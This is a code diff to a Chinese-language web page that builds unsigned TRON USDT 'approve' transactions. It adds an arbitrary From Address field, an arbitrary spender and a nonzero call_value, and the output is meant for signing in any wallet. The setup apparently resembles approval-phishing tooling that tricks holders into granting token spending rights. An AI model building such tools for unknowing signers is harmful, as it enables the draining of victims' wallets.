@@ -83,6 +83,14 @@
             </div>
 
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <!-- From Address -->
+                <div>
+                    <label class="text-xs text-zinc-400 block mb-1">From Address（你的 TRON 地址）</label>
+                    <input id="from_address" type="text" value="TYourRealTronAddressHere1234567890Ab" 
+                           class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-3 font-mono text-sm focus:outline-none focus:border-amber-500">
+                    <div class="text-[10px] text-zinc-500 mt-0.5">必须是有效的 TRON base58 地址（以 T 开头）</div>
+                </div>
+
                 <!-- call_value -->
                 <div>
                     <label class="text-xs text-zinc-400 block mb-1">call_value（sun）</label>
@@ -94,8 +102,9 @@
                 <!-- Spender -->
                 <div>
                     <label class="text-xs text-zinc-400 block mb-1">spender（授权给谁）</label>
-                    <input id="spender" type="text" value="T9vD65m4vN5vK8vL9vM0vN1vP2vQ3vR4vS5vT6" 
+                    <input id="spender" type="text" value="TSpenderExampleAddress1234567890AbCdEf" 
                            class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-3 font-mono text-sm focus:outline-none focus:border-amber-500">
+                    <div class="text-[10px] text-zinc-500 mt-0.5">必须是有效的 TRON base58 地址</div>
                 </div>
 
                 <!-- Amount -->
@@ -223,55 +232,62 @@
         }
 
         async function buildTransaction() {
-            if (!tronWebInstance) {
-                alert('请先连接 TronLink 钱包');
-                return;
-            }
-
             const callValueSun = parseInt(document.getElementById('call_value').value) || 10000;
+            const fromAddress = document.getElementById('from_address').value.trim();
             const spender = document.getElementById('spender').value.trim();
             const amountStr = document.getElementById('approve_amount').value.trim();
             
-            if (!spender || !amountStr) {
-                alert('请填写完整的 spender 和 approve 金额');
+            if (!fromAddress || !spender || !amountStr) {
+                alert('请填写 From Address、spender 和 approve 金额');
+                return;
+            }
+
+            // 优先用已连接的，否则创建 standalone TronWeb（构建交易不需要私钥）
+            let builder = tronWebInstance;
+            if (!builder && typeof TronWeb !== 'undefined') {
+                builder = new TronWeb({ fullHost: 'https://api.trongrid.io' });
+            }
+            if (!builder) {
+                alert('TronWeb 初始化失败，请刷新页面重试');
                 return;
             }
 
             const usdtContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
             try {
-                // 使用 TronWeb 高级 API 构造交易
-                const txBuilder = await tronWebInstance.transactionBuilder.triggerSmartContract(
+                const txBuilder = await builder.transactionBuilder.triggerSmartContract(
                     usdtContract,
                     'approve(address,uint256)',
                     {
-                        callValue: callValueSun,           // ← 关键：这里设置 call_value
-                        feeLimit: 150_000_000,             // 150 TRX 足够
+                        callValue: callValueSun,
+                        feeLimit: 150_000_000,
                         shouldPollResponse: false
                     },
                     [
                         { type: 'address', value: spender },
                         { type: 'uint256', value: amountStr }
                     ],
-                    userAddress
+                    fromAddress
                 );
 
                 currentTx = txBuilder.transaction;
 
-                // 显示结果
                 document.getElementById('result_area').classList.remove('hidden');
                 document.getElementById('txid_display').textContent = currentTx.txID || '(构建成功，待签名)';
                 document.getElementById('result_callvalue').textContent = callValueSun + ' sun (' + (callValueSun / 1_000_000) + ' TRX)';
 
-                // 更新 TronScan 链接（构建后 txID 可能还是临时的）
                 const link = document.getElementById('tronscan_link');
                 link.href = `https://tronscan.org/#/transaction/${currentTx.txID || ''}`;
 
-                alert('交易构造成功！\n现在可以点击「签名并上链」按钮用 TronLink 签名广播。');
+                alert('交易构造成功！可用于 imToken 等任意钱包签名上链。');
 
             } catch (error) {
                 console.error('构建交易失败:', error);
-                alert('构建失败: ' + (error.message || error));
+                let msg = (error.message || error.toString());
+                if (msg.toLowerCase().includes('base58') || msg.toLowerCase().includes('address')) {
+                    msg = '地址格式错误（none-base58）！\n请确保 From Address 和 Spender 都是有效的 TRON base58 地址（34位、以 T 开头、有正确校验）。';
+                }
+                alert('构建失败: ' + msg);
             }
         }
 
